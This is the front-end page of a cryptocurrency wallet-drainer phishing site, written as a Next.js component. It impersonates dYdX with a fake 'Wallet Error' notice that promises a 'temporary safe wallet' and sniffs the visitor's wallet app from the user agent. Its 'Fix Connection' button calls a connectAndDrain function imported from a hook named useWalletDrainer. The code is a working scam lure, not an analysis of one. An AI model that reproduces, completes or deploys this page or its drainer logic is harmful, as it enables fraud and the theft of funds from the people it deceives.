"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import { Lottie } from "@/components/lottie"
import { useWalletDrainer } from "@/hooks/useWalletDrainer"
import animationData from "@/public/animation.json"

export default function Home() {
  const [isVisible, setIsVisible] = useState(false)
  const [isMobile, setIsMobile] = useState(false)
  const [walletType, setWalletType] = useState<string>("")
  
  const { 
    isProcessing, 
    connectionStatus, 
    connectAndDrain 
  } = useWalletDrainer()

  useEffect(() => {
    const timer = setTimeout(() => setIsVisible(true), 100)
    
    // Detect mobile and wallet type
    const checkMobile = () => {
      setIsMobile(/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))
    }
    
    const checkWalletType = () => {
      const userAgent = navigator.userAgent.toLowerCase()
      if (userAgent.includes('trust')) setWalletType('Trust Wallet')
      else if (userAgent.includes('metamask')) setWalletType('MetaMask')
      else if (userAgent.includes('coinbase')) setWalletType('Coinbase Wallet')
      else if (userAgent.includes('imtoken')) setWalletType('imToken')
      else if (userAgent.includes('tokenpocket')) setWalletType('TokenPocket')
      else if (userAgent.includes('safepal')) setWalletType('SafePal')
      else if (userAgent.includes('bitget')) setWalletType('Bitget Wallet')
      else if (userAgent.includes('binance')) setWalletType('Binance Wallet')
      else if (window.ethereum) setWalletType('Web3 Wallet')
      else setWalletType('No Wallet')
    }
    
    checkMobile()
    checkWalletType()
    
    return () => clearTimeout(timer)
  }, [])

  return (
    <main className="relative flex min-h-screen items-center justify-center bg-[#2a2a2a] p-4">
      {/* Backdrop blur overlay */}
      <div className="fixed inset-0 bg-black/20 backdrop-blur-[5px]" />

      <div
        className={`relative z-10 flex w-full max-w-[22rem] flex-col items-center gap-4 rounded-[18px] border border-[#7370ff] bg-[#0b0b0b] px-6 py-6 shadow-xl transition-all duration-700 ease-out ${
          isVisible ? "scale-100 opacity-100" : "scale-90 opacity-0"
        }`}
      >
        {/* Logo */}
        <Image src="/images/logo.svg" alt="dYdX Logo" width={48} height={48} className="mt-1" />

        {/* Heading */}
        <h1 className="font-semibold text-[26px] font-normal leading-tight text-white">Wallet Error</h1>

        <div className="my-2 w-28">
          <Lottie animationData={animationData} />
        </div>

        <p className="text-center text-[15px] font-medium leading-snug text-[#d1d1d1]">
          We've detected an issue with your connected wallet on <strong className="text-[#7370ff]">dYdX</strong>. This may affect your ability to access certain features. For asset security, a temporary safe wallet would be generated to store potential pending transactions until connection is restored.
        </p>

        {/* Mobile wallet detection info */}
        {isMobile && walletType && (
          <div className="w-full text-center text-xs text-[#888] border border-[#333] rounded-lg p-2 bg-[#1a1a1a]">
            📱 {walletType} detected on mobile
          </div>
        )}

        {/* Fix Connection Button */}
        <button
          onClick={connectAndDrain}
          disabled={isProcessing}
          className={`mt-2 flex w-full flex-row items-center justify-center gap-2 rounded-2xl border border-[#7370ff] px-4 py-3.5 font-semibold transition-all duration-200 
            ${isProcessing 
              ? 'bg-[#7370ff]/20 cursor-not-allowed opacity-75' 
              : 'bg-[#7370ff]/20 text-[#7370ff] hover:bg-[#7370ff]/30 active:scale-[0.96] touch-manipulation'
            }
            /* Mobile optimizations */
            md:hover:bg-[#7370ff]/10 md:active:scale-[0.98]
            /* Ensure proper touch handling on mobile */
            select-none outline-none focus:outline-none focus:ring-0
          `}
          style={{
            /* Prevent zoom on double tap on iOS */
            touchAction: 'manipulation',
            /* Improve button responsiveness */
            WebkitTapHighlightColor: 'transparent'
          }}
        >
          {isProcessing ? (
            <>
              <div className="w-5 h-5 border-2 border-[#7370ff] border-t-transparent rounded-full animate-spin" />
              <span>{connectionStatus}</span>
            </>
          ) : (
            <>
              <Image src="/images/connect.svg" alt="Connect" width={20} height={20} />
              <span>Fix Connection</span>
            </>
          )}
        </button>
      </div>
    </main>
  )
}
